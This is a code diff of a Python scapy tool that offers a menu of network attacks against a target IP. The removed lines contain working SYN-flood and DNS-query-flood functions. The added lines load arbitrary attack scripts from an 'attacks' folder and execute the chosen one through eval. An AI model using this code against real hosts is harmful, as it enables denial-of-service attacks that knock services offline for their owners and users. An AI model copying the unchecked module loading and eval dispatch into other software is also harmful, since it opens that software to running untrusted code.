@@ -1,7 +1,9 @@
-from scapy.all import *
+'''from scapy.all import *
 import nmap
 import re
 import sys
+import os
+import importlib.util
 
 values = {}
 
@@ -76,14 +78,16 @@ while correct != "yes":
         
 
 # To test comment out everything above (including the import block) and uncomment the block below
-'''
-from scapy.all import *
+
+from scapy.all import *'''
 import re
 import sys
-import random
+import os
+import importlib.util
+
 
 values = {}
-ports = [80, 22, 53]
+ports = [80, 22, 53, "any"]
 values["ports"]=ports
 target_mac_address = "00:0c:29:ac:a4:4a"
 values["target_mac_address"]=target_mac_address
@@ -96,44 +100,7 @@ values["source_ip"]=source_ip
 target_ip = "1.1.1.1"
 values["target_ip"]=target_ip
 values["quantity"]=100
-'''
 
-# TEMPLATES EXAMPLE   
-def syn_flood():
-    print("SYN Flood")
-    valid_var = ["source_mac_address", "target_mac_address", "target_ip", "quantity"]
-    help_statement = "\nsends a multitude of SYN packets to attempt to overwhelm the target"
-    print("\nRunning SYN Flood attack, please enter the parameters:\n")
-    variable_input(valid_var, help_statement)
-    all_variables_inputted(valid_var)
-    check_var(values, valid_var)
-    template = (Ether(src=RandMAC(), dst=values.get("target_mac_address"))/IP(dst=values.get("target_ip"), ttl=99)/TCP(sport=RandShort(), seq=12345, ack=1000, flags="S"))
-    ns = []
-    pktAmt = int(values.get("quantity"))
-    for pktNum in range(0,pktAmt):
-    	ns.extend(template)
-    	ns[pktNum][TCP].dport = random.choice(ports)
-    print(ns)
-    send(ns)
-    print("Packets sent")
-
-def bind_dos():
-    print("Running DNS DOS attack, please enter the parameters:\n")
-    valid_var = ["target_ip", "query_type", "query_name","quantity"]
-    bind_var = ["query_type", "query_name"]
-    help_statement = "\nsends a multitude of DOS queries to attempt to overwhelm the target"
-    bind = []
-    variable_input(valid_var, help_statement)
-    all_variables_inputted(valid_var)
-    check_var(values, valid_var)
-    check_compat(values, bind_var)
-    template = IP(dst=values.get("target_ip"))/UDP()/DNS(rd=1,qd=DNSQR(qtype=values.get("query_type"),qname=values.get("query_name")))
-    pktAmt = int(values.get("quantity"))
-    for pktNum in range(0,pktAmt):
-    	bind.extend(template)
-    	bind[pktNum][UDP].dport = 53
-    send(bind)
-    print("Packets sent")
 
 # Confirms with user that all the variables are correct
 def check_var(values, required_var_list):
@@ -296,14 +263,19 @@ def reset():
 
 
 ########## MAIN MENU EXAMPLE ##########
+attacks_path = os.path.join(os.getcwd(), "attacks")
 
 available_templates = {"Attack Name/Explaination":"attack_function_name"}
-    
-if len(ports) != 0:
-    available_templates["SYN Flood"]=syn_flood
-    
-if 53 in ports:
-    available_templates["DNS DOS"]=bind_dos
+
+for filename in os.listdir(attacks_path):
+    if filename.endswith(".py"):
+        filepath = os.path.join(attacks_path, filename)
+        spec = importlib.util.spec_from_file_location(filename[:-3], filepath)
+        module = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(module)
+        if module.req_port in ports:
+            available_templates[module.name] = module.function_name
+            globals()[module.function_name] = getattr(module, module.function_name)
 
 
 while True:
@@ -312,7 +284,7 @@ while True:
     try:
         data = int(input("\n\nWhich Attack? (Enter a Number): "))
         if 1 <= data <= (len(list(available_templates.keys())) -1):
-            available_templates.get(list(available_templates.keys())[data])()
+            eval(available_templates.get(list(available_templates.keys())[data]) + "()")
             reset()
             #break
         else:
@@ -320,5 +292,3 @@ while True:
     except KeyboardInterrupt:
         print("\nExiting program")
         sys.exit()
-    except:
-        print("\nInvalid input")
